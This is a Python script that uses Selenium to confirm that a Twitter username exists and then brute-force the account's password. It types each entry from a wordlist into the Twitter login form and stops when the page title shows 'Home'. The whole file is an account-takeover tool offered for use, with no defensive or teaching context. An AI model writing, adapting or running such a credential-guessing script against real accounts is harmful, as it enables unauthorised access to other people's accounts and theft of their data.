# -*- coding: utf-8 -*-
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import sys

# Python 3 does not require sys.setdefaultencoding
# Reloading the sys module is not needed in Python 3

def twitUserCheck(username):
    try:
        driver = webdriver.Firefox()
        driver.get("https://twitter.com/" + username)
        # Check if the page contains the "Sorry, that page doesn’t exist!" message
        if "Sorry, that page doesn’t exist!" in driver.page_source:
            driver.close()
            return 1
        driver.close()
    except Exception as e:
        print(f"An error occurred: {e}")
        return 1

def twitterBruteforce(username, wordlist, delay):
    driver = webdriver.Firefox()
    driver.get("https://twitter.com/login")
    wait = WebDriverWait(driver, 10)
    
    with open(wordlist, 'r') as file:
        for line in file:
            password = line.strip("\n")
            try:
                elem = driver.find_element(By.NAME, "session[username_or_email]")
                elem.clear()
                elem.send_keys(username)
                
                elem = driver.find_element(By.NAME, "session[password]")
                elem.clear()
                elem.send_keys(password)
                elem.send_keys(Keys.RETURN)
                
                # Wait for the page to load and check for login success
                WebDriverWait(driver, delay).until(
                    EC.title_contains("Home")  # Adjust condition based on successful login indication
                )
                print("Worked")
                # You might want to break the loop or return here if login is successful
                break
            except AssertionError:
                print("Password incorrect or page did not load as expected.")
            except Exception as e:
                print(f"An error occurred: {e}")

    driver.close()
